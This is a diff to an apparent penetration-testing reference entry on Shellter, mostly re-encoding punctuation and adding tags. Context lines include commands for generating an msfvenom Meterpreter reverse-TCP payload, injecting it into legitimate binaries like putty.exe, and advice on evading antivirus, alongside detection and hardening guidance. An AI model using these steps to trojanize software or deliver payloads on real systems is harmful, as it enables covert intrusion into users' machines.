@@ -7,7 +7,7 @@
   "subcategory": "AV Bypass",
   "type": "command",
   "description": "Shellter is a dynamic PE infector that injects shellcode into a legitimate Windows 32-bit executable, making it appear as a normal program while executing a payload. Used in OSCP to bypass AV when delivering msfvenom payloads.",
-  "notes": "Run shellter on Kali (via wine) or on a Windows host. Requires a legitimate 32-bit PE (e.g., WinRAR installer, putty.exe). In Auto mode, shellter auto-selects injection points. Always use a real-world PE from the target OS architecture. 32-bit only — 64-bit PEs not supported. Stealth mode attempts to keep the original PE functionality intact post-payload. Also covered in: OSCP PEN-200 Chapter 14 (Antivirus Evasion).",
+  "notes": "Run shellter on Kali (via wine) or on a Windows host. Requires a legitimate 32-bit PE (e.g., WinRAR installer, putty.exe). In Auto mode, shellter auto-selects injection points. Always use a real-world PE from the target OS architecture. 32-bit only \u2014 64-bit PEs not supported. Stealth mode attempts to keep the original PE functionality intact post-payload. Also covered in: OSCP PEN-200 Chapter 14 (Antivirus Evasion).",
   "steps": [
     {
       "command": "sudo apt install shellter wine -y",
@@ -39,7 +39,7 @@
     {
       "command": "# Manual mode: M\n# Allows custom shellcode injection (paste hex shellcode from msfvenom -f hex)",
       "caption": "Manual mode for custom msfvenom shellcode",
-      "label": "Manual mode: M # Allows custom she…"
+      "label": "Manual mode: M # Allows custom she\u2026"
     },
     {
       "command": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f raw -o payload.raw\n# Then in shellter Manual mode, load payload.raw",
@@ -53,7 +53,7 @@
       "command": "shellter  # Auto mode -> putty.exe -> Stealth Y -> Meterpreter_Reverse_TCP"
     },
     {
-      "label": "Install shellter + wine32 on Kali (wine32 required — shellter is a 32-bit tool)",
+      "label": "Install shellter + wine32 on Kali (wine32 required \u2014 shellter is a 32-bit tool)",
       "command": "sudo apt install shellter -y\nsudo dpkg --add-architecture i386 && sudo apt-get update && sudo apt-get install wine32 -y"
     },
     {
@@ -99,19 +99,26 @@
     }
   ],
   "defense": {
-    "why_it_works": "Shellter is a dynamic PE infection tool that injects shellcode into existing legitimate PE binaries (e.g., PuTTY.exe, WinRAR.exe). Rather than creating a new malicious executable, it identifies execution paths in the legitimate binary, inserts junk code, and injects the payload at a natural execution point. The resulting binary still functions normally — making it appear legitimate in behavior analysis — while executing the payload in a separate thread. The original binary's code flow is preserved, making static analysis harder.",
+    "why_it_works": "Shellter is a dynamic PE infection tool that injects shellcode into existing legitimate PE binaries (e.g., PuTTY.exe, WinRAR.exe). Rather than creating a new malicious executable, it identifies execution paths in the legitimate binary, inserts junk code, and injects the payload at a natural execution point. The resulting binary still functions normally \u2014 making it appear legitimate in behavior analysis \u2014 while executing the payload in a separate thread. The original binary's code flow is preserved, making static analysis harder.",
     "prerequisites": "Shellter (Windows tool, runs under Wine on Linux). A legitimate PE binary to infect. Shellcode payload (Meterpreter, custom). Wine on Kali or Windows host for Shellter execution. 32-bit PE target (Shellter 7.x supports 64-bit via paid version).",
-    "impact": "T1055 Process Injection + T1027 Obfuscated Files or Information. Produces a legitimate-appearing executable that evades signature AV. The infected binary still functions — users are less suspicious. Payload injected via polymorphic code avoids static shellcode signatures.",
-    "detection": "Digital signature validation: if the original PE was signed, Shellter injection breaks the signature — WDAC or Authenticode check catches this. Behavioral EDR: PuTTY.exe making outbound C2 connection or spawning cmd.exe is anomalous. Memory scan: injected shellcode in the PE's process memory. AMSI: PowerShell payload within injected code. File hash: original binary hash no longer matches known-good hash.\nProcess injection by correlating memory manipulation API calls (VirtualAllocEx, WriteProcessMemory), suspicious thread creation (CreateRemoteThread), and unusual DLL loads within another process's context (DET0508/AN1399).\nptrace- or memfd-based injection through audit logs capturing system calls (ptrace, mmap) targeting running processes along with suspicious file descriptors or memory writes (AN1400).\nMemory-based injection via task_for_pid, mach_vm_write, and dylib injection patterns through DYLD_INSERT_LIBRARIES or manual memory mapping on macOS (AN1401).",
+    "impact": "T1055 Process Injection + T1027 Obfuscated Files or Information. Produces a legitimate-appearing executable that evades signature AV. The infected binary still functions \u2014 users are less suspicious. Payload injected via polymorphic code avoids static shellcode signatures.",
+    "detection": "Digital signature validation: if the original PE was signed, Shellter injection breaks the signature \u2014 WDAC or Authenticode check catches this. Behavioral EDR: PuTTY.exe making outbound C2 connection or spawning cmd.exe is anomalous. Memory scan: injected shellcode in the PE's process memory. AMSI: PowerShell payload within injected code. File hash: original binary hash no longer matches known-good hash.\nProcess injection by correlating memory manipulation API calls (VirtualAllocEx, WriteProcessMemory), suspicious thread creation (CreateRemoteThread), and unusual DLL loads within another process's context (DET0508/AN1399).\nptrace- or memfd-based injection through audit logs capturing system calls (ptrace, mmap) targeting running processes along with suspicious file descriptors or memory writes (AN1400).\nMemory-based injection via task_for_pid, mach_vm_write, and dylib injection patterns through DYLD_INSERT_LIBRARIES or manual memory mapping on macOS (AN1401).",
     "artifacts": "EDR: signed binary with broken/missing signature executing | Behavior: legitimate tool (PuTTY.exe) making unexpected network connections | WDAC: signature validation failure | Memory: injected shellcode in process space | File hash mismatch vs known-good",
-    "prevention": "WDAC with publisher rules: injection breaks the digital signature → binary fails publisher/hash check → blocked before execution. Behavioral monitoring: flag applications making unexpected network connections. SmartScreen: reputation-based blocking for modified known binaries. EDR memory scanning. File integrity monitoring on delivered executables.\nBehavior Prevention on Endpoint: Configure endpoint security solutions to block process injection based on common injection sequences; Windows 10 ASR rules can prevent Office applications from code injection.\nPrivileged Account Management: Use Yama (ptrace_scope) on Linux to restrict ptrace to privileged users; deploy security kernel modules.",
-    "evasion": "Inject into a less commonly used legitimate binary that the target is expected to run. Use staged payload (small stager that fetches actual payload) — injected code doesn't contain recognizable payload patterns. Test against target AV before delivery. Use 64-bit PE (newer Shellter).",
+    "prevention": "WDAC with publisher rules: injection breaks the digital signature \u2192 binary fails publisher/hash check \u2192 blocked before execution. Behavioral monitoring: flag applications making unexpected network connections. SmartScreen: reputation-based blocking for modified known binaries. EDR memory scanning. File integrity monitoring on delivered executables.\nBehavior Prevention on Endpoint: Configure endpoint security solutions to block process injection based on common injection sequences; Windows 10 ASR rules can prevent Office applications from code injection.\nPrivileged Account Management: Use Yama (ptrace_scope) on Linux to restrict ptrace to privileged users; deploy security kernel modules.",
+    "evasion": "Inject into a less commonly used legitimate binary that the target is expected to run. Use staged payload (small stager that fetches actual payload) \u2014 injected code doesn't contain recognizable payload patterns. Test against target AV before delivery. Use 64-bit PE (newer Shellter).",
     "sources": [
       "https://attack.mitre.org/techniques/T1055/",
       "https://attack.mitre.org/techniques/T1027/"
     ],
-    "misconfiguration": "WDAC not deployed — unsigned/modified executables run freely. SmartScreen disabled. No behavioral monitoring for application network behavior anomalies. No file hash validation on delivered executables.",
-    "vulnerable_config": "# WDAC not configured:\n# Any PE (including shellter-infected) runs without signature check\n\n# SmartScreen disabled:\n(Get-ItemProperty 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System').EnableSmartScreen  # 0 or absent\n\n# No file hash validation:\n# Delivery mechanism (email, file share) doesn't compare against known-good hashes\n# → shellter-infected PuTTY.exe indistinguishable from real one to users",
-    "secure_config": "# WDAC publisher rules catch signature breakage:\n# If PuTTY.exe was signed by Simon Tatham and Shellter breaks the signature:\n# WDAC enforced policy: binary fails publisher check → blocked\nNew-CIPolicy -Level Publisher -FilePath C:\\Policy\\BasePolicy.xml -UserPEs\nConvertFrom-CIPolicy C:\\Policy\\BasePolicy.xml C:\\Windows\\System32\\CodeIntegrity\\SIPolicy.p7b\n\n# Enable SmartScreen:\nSet-ItemProperty 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System' -Name EnableSmartScreen -Value 1\nSet-ItemProperty 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System' -Name ShellSmartScreenLevel -Value Block\n\n# Behavioral: Defender for Endpoint network protection:\nSet-MpPreference -EnableNetworkProtection Enabled\n# Alert: putty.exe connecting to non-SSH port = anomaly"
-  }
+    "misconfiguration": "WDAC not deployed \u2014 unsigned/modified executables run freely. SmartScreen disabled. No behavioral monitoring for application network behavior anomalies. No file hash validation on delivered executables.",
+    "vulnerable_config": "# WDAC not configured:\n# Any PE (including shellter-infected) runs without signature check\n\n# SmartScreen disabled:\n(Get-ItemProperty 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System').EnableSmartScreen  # 0 or absent\n\n# No file hash validation:\n# Delivery mechanism (email, file share) doesn't compare against known-good hashes\n# \u2192 shellter-infected PuTTY.exe indistinguishable from real one to users",
+    "secure_config": "# WDAC publisher rules catch signature breakage:\n# If PuTTY.exe was signed by Simon Tatham and Shellter breaks the signature:\n# WDAC enforced policy: binary fails publisher check \u2192 blocked\nNew-CIPolicy -Level Publisher -FilePath C:\\Policy\\BasePolicy.xml -UserPEs\nConvertFrom-CIPolicy C:\\Policy\\BasePolicy.xml C:\\Windows\\System32\\CodeIntegrity\\SIPolicy.p7b\n\n# Enable SmartScreen:\nSet-ItemProperty 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System' -Name EnableSmartScreen -Value 1\nSet-ItemProperty 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System' -Name ShellSmartScreenLevel -Value Block\n\n# Behavioral: Defender for Endpoint network protection:\nSet-MpPreference -EnableNetworkProtection Enabled\n# Alert: putty.exe connecting to non-SSH port = anomaly"
+  },
+  "tags": [
+    "shellter",
+    "av-evasion",
+    "pe-injection",
+    "msfvenom",
+    "antivirus"
+  ]
 }
